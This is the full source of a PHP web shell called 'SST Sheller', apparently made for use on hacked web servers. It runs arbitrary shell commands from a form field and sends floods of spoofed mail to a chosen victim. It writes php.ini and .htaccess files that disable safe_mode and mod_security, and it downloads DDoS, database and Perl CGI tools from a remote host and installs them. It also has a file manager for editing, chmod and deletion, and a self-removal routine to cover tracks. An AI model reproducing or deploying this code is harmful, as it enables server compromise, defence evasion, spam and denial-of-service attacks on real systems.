<?php
/*
/ This Sheller Design And Coded By: Mr.Amir-Masoud
/ Y!ID: mr.amir-masoud@att.net
/ Mail: am1r@dr.com
/the time im in sepehr-team.org in sheller is match with sepehr-team
*/
session_start();

if (empty($_SESSION['count'])) {
 $_SESSION['count'] = 1;
} else {
 $_SESSION['count']++;
}
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />

<script type="text/javascript" src="http://code.jquery.com/jquery-latest.pack.js"></script>

<script>

$(document).ready(function() {	

	//select all the a tag with name equal to modal
	$('a[name=modal]').click(function(e) {
		//Cancel the link behavior
		e.preventDefault();
		
		//Get the A tag
		var id = $(this).attr('href');
	
		//Get the screen height and width
		var maskHeight = $(document).height();
		var maskWidth = $(window).width();
	
		//Set heigth and width to mask to fill up the whole screen
		$('#mask').css({'width':maskWidth,'height':maskHeight});
		
		//transition effect		
		$('#mask').fadeIn(1000);	
		$('#mask').fadeTo("slow",0.8);	
	
		//Get the window height and width
		var winH = $(window).height();
		var winW = $(window).width();
              
		//Set the popup window to center
		$(id).css('top',  winH/2-$(id).height()/2);
		$(id).css('left', winW/2-$(id).width()/2);
	
		//transition effect
		$(id).fadeIn(2000); 
	
	});
	
	//if close button is clicked
	$('.window .close').click(function (e) {
		//Cancel the link behavior
		e.preventDefault();
		
		$('#mask').hide();
		$('.window').hide();
	});		
	
	//if mask is clicked
	$('#mask').click(function () {
		$(this).hide();
		$('.window').hide();
	});			
	
});

</script>
<style>
	body{
	background-image:url('http://yahoo21.persiangig.com/sheller/style/images/bg.jpg');
	background-repeat:repeat-x;
	background-color:#dff0e7;
	padding:0 0 0 0;
	margin:0 0 0 0;
	font-family:Tahoma;
}

a {color:#333; text-decoration:none}
a:hover {color:#ccc; text-decoration:none}

#mask {
  position:absolute;
  left:0;
  top:0;
  z-index:9000;
  background-color:#000;
  display:none;
}
  
#boxes .window {
  position:absolute;
  left:0;
  top:0;
  width:440px;
  height:200px;
  display:none;
  z-index:9999;
  padding:20px;
}

#boxes #dialog {
  width:375px; 
  height:203px;
  padding:10px;
  background-color:#ffffff;
}
#boxes #information {
  width:375px; 
  height:203px;
  padding:10px;
  background-color:#ffffff;
}
#boxes #dialog1 {
  width:375px; 
  height:203px;
}

#dialog1 .d-header {
  background:url(http://yahoo21.persiangig.com/sheller/style/images/login-header.png) no-repeat 0 0 transparent; 
  width:375px; 
  height:150px;
}

#dialog1 .d-header input {
  position:relative;
  top:60px;
  left:100px;
  border:3px solid #cccccc;
  height:22px;
  width:200px;
  font-size:15px;
  padding:5px;
  margin-top:4px;
}

#dialog1 .d-blank {
  float:left;
  background:url(http://yahoo21.persiangig.com/sheller/style/images/login-blank.png) no-repeat 0 0 transparent; 
  width:267px; 
  height:53px;
}

#dialog1 .d-login {
  float:left;
  width:108px; 
  height:53px;
}

#boxes #dialog2 {
  background:url(http://yahoo21.persiangig.com/sheller/style/images/notice.png) no-repeat 0 0 transparent; 
  width:326px; 
  height:229px;
  padding:50px 0 20px 25px;
}
	#container{
	width:900px;
	margin:10px auto 20px auto;
	
}
	#header{
	background-image:url('http://yahoo21.persiangig.com/sheller/style/images/logo.png');
	background-repeat:no-repeat;
	background-position:right top;
	height:100px;
	width:100%;
}
	#menu{
	background-color:#004F75;
	color:white;
	height:35px;
	-moz-border-radius-topleft:10px;
	-moz-border-radius-topright:10px;
}
	#menu a:first-child{
	-moz-border-radius-topright:10px;
}
	#menu a{
	display:block;
	float:right;
	color:white;
	line-height:35px;
	font-family:Tahoma;
	font-size:12px;
	text-decoration:none;
	padding-left:10px;
	padding-right:10px;
	background-image:url('http://yahoo21.persiangig.com/sheller/style/images/mbg.png');
	background-repeat:no-repeat;
	background-position:left top;
}
	#menu a:hover{
	background-color:#005782
}
	#content{
	padding:10px;
	background-color:white;
	-moz-border-radius-bottomleft:10px;
	-moz-border-radius-bottomright:10px;
}
	#sidebar{
	width:285px;
	float:left;
}
	#sidebar #block{
	width:100%;
	margin-bottom:10px
}
	#fullrow{
	width:581px;
	margin-left:10px;
	float:right;
}
	#lastnews{
	background-image:url('http://yahoo21.persiangig.com/sheller/style/images/news.png');
	width:100%;
	height:35px;
	line-height:35px;
	color:white;
}
	#lastnews a{
	color:white;
	margin-right:20px
}
	#fullrow #block {
	margin-top:10px;
	width:100%;
	-moz-border-radius:5px;
}
	#inside{
	margin:10px;
}
	.hostingservices {
	border:1px #054260 solid;
}
	.hostingservices #inside div{
	float:right
}


	

	.customers{
	border:1px #1f5a23 solid;
	-moz-border-radius:10px

}
	.customerss{
	border:1px #1f5a23 solid;
	-moz-border-radius:10px

}
	.customers h2{
	background-image:url('http://yahoo21.persiangig.com/sheller/style/images/rss.png');
	display:block;
	background-position:right top;
	background-repeat:no-repeat;
	height:34px;
	margin:0 0 0 0;
	padding:0 0 0 0;
	-moz-border-radius-topleft:10px;
	-moz-border-radius-topright:10px;

}
	.customerss h2{
	background-image:url('http://yahoo21.persiangig.com/sheller/style/images/msg.png');
	display:block;
	background-position:right top;
	background-repeat:no-repeat;
	height:34px;
	margin:0 0 0 0;
	padding:0 0 0 0;
	-moz-border-radius-topleft:10px;
	-moz-border-radius-topright:10px;

}

	#sidebar #block #inside{
	margin:10px
}
	.customers #inside a{
	display:block;
	line-height:25px;
	color:green;
	border-top:1px green solid
}
	
	.customers #inside a:first-child{
	border-top:none
}
	
	.customers #inside a:hover{
	background-color:#F4FFF4
}

	.stats{
	border:1px #6b3338 solid;
	-moz-border-radius:10px

}
	.stats h2{
	background-image:url('http://yahoo21.persiangig.com/sheller/style/images/stats.png');
	display:block;
	background-position:right top;
	background-repeat:no-repeat;
	height:34px;
	margin:0 0 0 0;
	padding:0 0 0 0;
	-moz-border-radius-topleft:10px;
	-moz-border-radius-topright:10px;

}

	


</style>
<title>SST Sheller !</title>
<body>
<div id="boxes">

<div id="information" class="window">

<a href="#"class="close"/>Close it</a><br />

<?php
$server_software = getenv("SERVER_SOFTWARE"); 
?>
<div style="font-size:11px;">
<?
echo "Software:";
echo $server_software; 

?><hr />

uname -a:&nbsp;<?php echo wordwrap(php_uname(),90,"<br>",1); ?>
<hr />
<?
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") 
{ 
 $safemode = TRUE; 
 $hsafemode = "<font color=red>ON (secure)</font>"; 
} 
else {$safemode = FALSE; $hsafemode = "<font color=green>OFF (not secure)</font>";} 
echo "Safe Mod:".$hsafemode;
echo"<hr />";
echo "<b>Your ip: <a href=http://whois.domaintools.com/".$_SERVER["REMOTE_ADDR"].">".$_SERVER["REMOTE_ADDR"]."</a> - Server ip: <a href=http://whois.domaintools.com/".gethostbyname($_SERVER["HTTP_HOST"]).">".gethostbyname($_SERVER["HTTP_HOST"])."</a></b><br/>";

?>

</div>
</div>
  
 



<!-- Start of Sticky Note -->
<div id="dialog2" class="window">
<div style="font-family:Corbel; font-size:12px;">

Hello ! <br />
This Shell Coded By: Mr.Amir-Masoud !<br />
Mail: am1r@dr.com<br />
Y!ID: mr.amir-masoud@att.net<br />
Home: sepehr-team.org<br />
Zone-h: http://zone-h.com/archive/notifier=mr.amir-masoud<br />
TnQ To: Scary Boys For File Manager ! 
<br />
</div><input type="button" value="Close it" class="close"/>

</div>
<!-- End of Sticky Note -->



<!-- Mask to cover the whole screen -->
  <div id="mask"></div>
</div>
<div id="container">
		<div id="header">
			<a href="http://www.mozilla.com/en-US/" id="firefox" target="_blank"></a>
		</div>
		<div id="menu">
			<a href="?">Home</a>
			<a href="#information" name="modal">Information</a>
			<a href="?page=fakemail">Fake Mail </a>
			<a href="?page=filemanager&id=fm">File Manager</a>
			<a href="?page=safemodbypass">SafeMod Bypass</a>
			<a href="?page=database">DataBase</a>
			<a href="?page=encryption">Encryption</a>
			<a href="?page=symlinkbypass">Symlink Bypass</a>
			<a href="?page=ddos">DDoser</a>
			<a href="?page=upload">Upload</a>

			<a href="#dialog2" name="modal">Contact Us</a>

		</div>	
		<div id="content">
			<div id="sidebar">
				<div id="block" class="customers">
				<h2 title="Rss"></h2>
<!-- Begin ParsTools.com RSSREADER Code --><script language="javascript" src="http://parstools.com/rss/?url=http://www.sepehr-team.org/forums/external.php?type=RSS2&n=10&link=y&date=n&width=250&dir=rtl&bgcolor=FFFFFF&bdcolor=FFFFFF"></script><div  style="display:none;"></div><!-- End RSSREADER code -->
				</div>
				<div id="block" class="customerss">
				<h2 title="Message From Mr.Amir-Masoud"></h2>
					<div id="inside">
<iframe src="http://elhamit77.persiangig.com/sheller/message.html" width="260px" frameborder="0"></iframe>
					</div>
				</div>
				<div id="block" class="stats">
				<h2 title="آمار سایت"></h2>
					<div id="inside">
Reload Page: <?php echo $_SESSION['count']; ?>
					</div>
				</div>

			</div>
			
			<div id="fullrow">


				<div id="block" class="hostingservices">
					
					<div id="inside">
<?php
if(ISSET($_GET['page'])){
    if($_GET{'page'}=='upload'){
        ?>
         <?php 
 $target = ""; 
 $target = $target . basename( $_FILES['uploaded']['name']) ; 
 $ok=1; 
 if(move_uploaded_file($_FILES['uploaded']['tmp_name'], $target)) 
 {
 echo "The File ". basename( $_FILES['uploadedfile']['name']). " has been uploaded<br />";
 } 
 else {
 echo "";
 }
  $target = ""; 
 $target = $target . basename( $_FILES['uploaded1']['name']) ; 
 $ok=1; 
 if(move_uploaded_file($_FILES['uploaded1']['tmp_name'], $target)) 
 {
 echo "";
 } 
 else {
 echo "";
 }
   $target = ""; 
 $target = $target . basename( $_FILES['uploaded2']['name']) ; 
 $ok=1; 
 if(move_uploaded_file($_FILES['uploaded2']['tmp_name'], $target)) 
 {
 echo "";
 } 
 else {
 echo "";
 }
    $target = ""; 
 $target = $target . basename( $_FILES['uploaded3']['name']) ; 
 $ok=1; 
 if(move_uploaded_file($_FILES['uploaded3']['tmp_name'], $target)) 
 {
 echo "";
 } 
 else {
 echo "";
 }
 
 ?>
<form enctype="multipart/form-data" action="" method="POST">
 <input name="uploaded" type="file" />
 <input name="uploaded1" type="file" />
 <input name="uploaded2" type="file" />
 <input name="uploaded3" type="file" />
 <input type="submit" value="Upload" />
 </form> 
     

<?php
    }elseif($_GET['page']=='fakemail'){
        ?>
						<?
		error_reporting(0);
		echo "<br><center><h2>Fake Mail And Dos Mail</h2></center>" ;
		echo "<center><form method='post' action=''>
		Victim Mail :<br><input type='text' name='to' ><br>
		Number-Mail :<br><input type='text' size='5' name='nom' value='100'><br>
		Comments:
		<br>
		<textarea rows='10' cols=50 name='Comments' ></textarea><br>
		<input type='submit' value='Send Mail' >
		</form></center>";
		$to=$_POST['to'];
		$nom=$_POST['nom'];
		$Comments=$_POST['Comments'];
		if ($to <> "" ){
		for ($i = 0; $i < $nom ; $i++){
		$from = rand (71,1020000000)."@"."google.com";
		$subject= md5("$from");
        mail($to,$subject,$Comments,"From:$from");
        echo "$i is ok";
        }      
        echo "<script language='javascript'> alert('Sending Mail - please waite ...')</script>";
		}

    }elseif($_GET['page']=='safemodbypass'){
        ?>
<?PHP
$safe_fun = fopen("php.ini","w+");
fwrite($safe_fun,"safe_mode = Off
disable_functions = NONE
safe_mode_gid = OFF
open_basedir = OFF ");
echo "<center><font color=#990000  size=1>php.ini Has Been Generated Successfully </font><br></center>";

$safe_funini = fopen("ini.ini","w+");
fwrite($safe_funini,"safe_mode = Off
disable_functions = NONE
safe_mode_gid = OFF
open_basedir = OFF ");
echo "";

$mode_sec = fopen(".htaccess","w+");
fwrite($mode_sec,"<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
SecFilterCheckURLEncoding Off
SecFilterCheckCookieFormat Off
SecFilterCheckUnicodeEncoding Off
SecFilterNormalizeCookies Off

</IfModule> ");
echo "<center><font color=#990000  size=1>.htaccess Has Been Generated Successfully </font></center>";

echo ini_get("safe_mode");
echo ini_get("open_basedir");
ini_restore("safe_mode");
ini_restore("open_basedir");
echo ini_get("safe_mode");
echo ini_get("open_basedir");
echo "<center><font color=#990000  size=1>ini.php Has Been Generated Successfully </font></center>";
?>
<?
    }elseif($_GET['page']=='database1'){

    }elseif($_GET['page']=='ddos'){
		$source = 'http://yahoo21.persiangig.com/sheller/ddos.txt';
$destination = 'ddos.php';

$data = file_get_contents($source);

$handle = fopen($destination, "w");
fwrite($handle, $data);
fclose($handle);
if($handle)
{
?>
<iframe src="ddos.php" width="550px" height="400px"></iframe>
<?
}
else
{
	echo"Not View ! , Plz Disable Your Web Anti Virus Next Refresh This Page ! ";
}
    }elseif($_GET['page']=='database'){
$source = 'http://yahoo21.persiangig.com/sheller/my.txt';
$destination = 'db.php';

$data = file_get_contents($source);

$handle = fopen($destination, "w");
fwrite($handle, $data);
fclose($handle);

?>
<iframe src="db.php" width="550px" height="400px"></iframe>
<?
    }elseif($_GET['page']=='symlinkbypass'){
$sybpp = system('mkdir sym');

$symby = fopen("sym/.htaccess","w+");
fwrite($symby,"Options Indexes FollowSymLinks
DirectoryIndex ssssss.htm
AddType txt .php
AddHandler txt .php
AddHandler cgi-script .cgi
AddHandler cgi-script .pl");
echo "<font face='Corbel' size='-1'>Ok! => Create .htaccess Done !</br>Ok! => Create .htaccess For Run Perl !</font>";

$source = 'http://yahoo21.persiangig.com/sheller/cgi.pl';
$destination = 'sym/cgi.pl';

$data = file_get_contents($source);

$handle = fopen($destination, "w");
fwrite($handle, $data);
fclose($handle);

echo "<br /><font face='Corbel' size='-1'>Ok! => Cgi Done !</br> For Use Open: sym/cgi.pl<br>For Login Insert This Password: mr.amir-masoud</font>";
system('chmod 0755 sym/cgi.pl');
    }elseif($_GET['page']=='filemanager'){
error_reporting(E_ERROR | E_WARNING | E_PARSE);

 $fedit=$_GET['fedit'];
 if ($fedit <> "" ){
 $fedit=realpath($fedit);
 $lines = file($fedit);
 echo "<form action='' method='POST'>";
echo "<textarea name='savefile' rows=30 cols=80>" ;
foreach ($lines as $line_num => $line) {
 echo htmlspecialchars($line);
}
echo "</textarea>
	<input type='text' name='filepath'  size='60' value='$fedit'>
	<input type='submit' value='save'></form>";
	$savefile=$_POST['savefile'];
	$filepath=realpath($_POST['filepath']);
	if ($savefile <> "") 
	{
	$fp=fopen("$filepath","w+");
	fwrite ($fp,"") ;
	fwrite ($fp,$savefile) ;
	fclose($fp);
	echo "<script language='javascript'> close()</script>";
	}
exit();
 }


$fchmod=$_GET['fchmod'];
if ($fchmod <> "" ){
$fchmod=realpath($fchmod);
echo "<center><br>
chmod for :$fchmod<br>
<form method='POST' action=''><br>
Chmod :<br>
<input type='text' name='chmod0' ><br>
<input type='submit' value='change chmod'>
</form>";
$chmod0=$_POST['chmod0'];
if ($chmod0 <> ""){
chmod ($fchmod , $chmod0);
}else {
echo "primission Not Allow change Chmod";
}
exit();
}



			$id=$_GET['id'];

			$homedir=getcwd();
			$dir=realpath($_GET['dir'])."/";
			if ($id=="fm"){
			echo "
                 <br>";

			echo "

<div align='center'>

<table border='1' id='table1' style='border: 1px #333333' height='90' cellspacing='0' cellpadding='0'>
	<tr>
		<td width='300' height='30' align='left'><b><font size='2'>File / Folder Name</font></b></td>
		<td height='28' width='82' align='center'>
		<font color='#000080' size='2'><b>Size KByte</b></font></td>
		<td height='28' width='83' align='center'>
		<font color='#008000' size='2'><b>Edit</b></font></td>
		<td height='28' width='66' align='center'>
		<font color='#FF9933' size='2'><b>Chmod</b></font></td>
		<td height='28' width='75' align='center'>
		<font color='#999999' size='2'><b>Delete</b></font></td>
	</tr>";
		    if (is_dir($dir)){
		    if ($dh=opendir($dir)){
		    while (($file = readdir($dh)) !== false) {
		    $fsize=round(filesize($dir . $file)/1024);
		
		    
	echo " 
	<tr>
		<th width='250' height='22' align='left' nowrap>";
		if (is_dir($dir.$file))
		{
		echo "<a href='?page=filemanager&id=fm&dir=$dir$file'><span style='text-decoration: none'><font size='2' color='#666666'>&nbsp;$file <font color='#FF0000' size='1'>dir</font>";
		}
		else {
		echo "<font size='2' color='#666666'>&nbsp;$file ";
		}
		echo "</a></font></th>
		<td width='113' align='center' nowrap><font color='#000080' size='2'><b>";
		if (is_file($dir.$file))
		{
		echo "$fsize";
		}
		else {
		echo "&nbsp; ";
		}
		echo "
		</b></font></td>
		";
		if (is_file($dir.$file)){
		if (is_readable($dir.$file)){
		echo "";
		}else {
		echo "";
		 }
		}else {
		echo "&nbsp;";
		 }
		echo "
		
		<td width='77' align='center' nowrap>";
		if (is_file($dir.$file))
		{
		if (is_readable($dir.$file)){
		echo "<a target='_blank' href='?page=filemanager&id=fm&fedit=$dir$file'><span style='text-decoration: none'><font color='#FF9933' size='2'>Edit";
		}else {
		echo "<font size='1' color='#FF0000'><b>No ReadAble</b>";
		 }
		}else {
		echo "&nbsp;";
		 }
		echo "
		</a></font></td>
		<td width='86' align='center' nowrap>";
		if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
		echo "<font size='1' color='#999999'>Dont in windows";
		}
		else {
		echo "<a href='?page=filemanager&id=fm&fchmod=$dir$file'><span style='text-decoration: none'><font size='2' color='#999999'>Chmod";
		}
		echo "</a></font></td>
		<td width='86'align='center' nowrap><a href='?page=filemanager&id=fm&fdelete=$dir$file'><span style='text-decoration: none'><font size='2' color='#FF0000'>Delete</a></font></td>
	</tr>
	";
		      }
		      closedir($dh);
		    } 
		    }
		    echo "</table>

		    </div>";
			}

$frpath=$_GET['fdelete'];
if ($frpath <> "") {
if (is_dir($frpath)){
$matches = glob($frpath . '/*.*');
if ( is_array ( $matches ) ) {
  foreach ( $matches as $filename) {
  unlink ($filename);
  rmdir("$frpath");
echo "<script language='javascript'> alert('Success! Please refresh')</script>";
echo "<script language='javascript'> history.back(1)</script>";
  }
  }
  }
  else{
echo "<script language='javascript'> alert('Success! Please refresh')</script>";
unlink ("$frpath");
echo "<script language='javascript'> history.back(1)</script>";
exit(0);

  }
  

}
			?>
			
			</td>
		</tr>
		<tr>
			<td style="border: 1px dotted #FFCC66">
			<p align="center"><font color="#666666" size="1" face="Tahoma"><br>
Coded By: Mr.Amir-Masoud | Sepehr-team.org | Thanks To Scary-Boys 4 File Manager ! :X
</td>
		</tr>
	</table>

<?
    }elseif($_GET['page']=='encryption'){
echo "
<table bgcolor=#cccccc width=\"100%\">
<tbody><tr><td align=\"right\" width=100>
<p dir=ltr><b><font color=#990000  size=-2><br><p align=left><center>

Encypton With ( MD5 | Base64 | Crypt | SHA1 | MD4 | SHA256 )<br><br>
<form method=\"POST\">
<font color=\"gray\">String To Encrypt : </font><input type=\"text\" value=\"\" name=\"ENCRYPTION\">
<input type=\"submit\" value=\"Submit\"></form>";
if(!$_POST['ENCRYPTION']=='')
{
$md5 = $_POST['ENCRYPTION'];
    echo "<font color=gray>MD5 : </font>".md5($md5)."<br>";
    echo "<font color=gray>Base64 : </font>".base64_encode($md5)."<br>";
    echo "<font color=gray>Crypt : </font>".CRYPT($md5)."<br>";
    echo "<font color=gray>SHA1 : </font>".SHA1($md5)."<br>";
    echo "<font color=gray>MD4 : </font>".hash("md4",$md5)."<br>";
    echo "<font color=gray>SHA256 : </font>".hash("sha256",$md5)."<br></tbody></tr></td></table>";
  }

?>	
<?

    }else{
        ?>
        <b>Wron Page Requested</b>
        <?php
    }
}else{

?>

						<!-- Tools -->
						Enter Command : 
<form id="form1" name="form1" method="post" action="">
  <label>
  <input type="text" name="cmd" style="background-color:#000000; color:#00FF00; font-family:Corbel;" />
  </label>

    <label>
    <input type="submit" name="Submit" value="Execute" />
    </label>


    <br /><br /><textarea name="textarea" style="width:14cm; height:5cm; background-color:#CCCCCC; color:#000000;">
							<?php

						if(isset($_POST['cmd']))
						{
   $cmd = $_POST['cmd'];
   if($cmd == "")
   {
	   echo "                              Please Insert Command!";
   }
   elseif(isset($cmd))
   {
   $output = system($cmd);

printf("$output\n"); 
   }
}

						?>
	</textarea>

</form>

<form id="form111" name="form1" method="post" action="">


    <label>
    <input type="submit" name="Submit1" value="Self Remove..."  />
    </label>
    <?
	if(isset($_POST['Submit1']))
	{
$filename = $_SERVER['SCRIPT_FILENAME'];
$filename1 = "db.php";
$filename2 = "ddos.php";
$filename3 = "php.ini";
$filename4 = ".htaccess";
$filename5 = "ini.ini";
$filename6 = "sym/.htaccess";
$filename7 = "sym/cgi.pl";
$dir = "dir";


		?>
<? unlink($filename); unlink($filename1); unlink($filename2); unlink($filename3); unlink($filename4); unlink($filename5); unlink($filename6);       unlink($filename7); rmdir($dir); ?>
        <meta http-equiv="refresh" content="0"><meta />
<?
	}
}

?>
					</div>
					<div style="clear:both"></div>
				</div>

			</div>
			<div style="clear:both"></div>
		</div>
		<hr />

						<div align="center" style="font-size:12px; font-family:Corbel;">
Coded By: Mr.Amir-Masoud [ Iranian HackerZ ]
</div>
	</div>
	

</body>
</html>
